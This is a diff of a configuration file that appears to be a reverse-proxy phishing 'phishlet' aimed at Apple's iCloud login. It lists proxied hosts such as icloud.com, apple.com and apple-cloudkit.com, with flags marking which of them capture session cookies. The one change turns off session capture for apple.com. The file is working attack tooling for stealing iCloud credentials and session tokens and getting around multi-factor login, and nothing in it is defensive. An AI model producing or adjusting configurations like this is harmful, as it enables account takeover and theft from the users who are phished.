@@ -3,7 +3,7 @@ min_ver: '2.3.0'
 
 proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'icloud.com', session: true, is_landing: true, auto_filter: false}
- - {phish_sub: 'www', orig_sub: 'www', domain: 'apple.com', session: true, is_landing: false, auto_filter: false}
+ - {phish_sub: 'www', orig_sub: 'www', domain: 'apple.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'apple-cloudkit.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'setup', orig_sub: 'setup', domain: 'icloud.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'feedbackws', orig_sub: 'feedbackws', domain: 'icloud.com', session: false, is_landing: false, auto_filter: false}
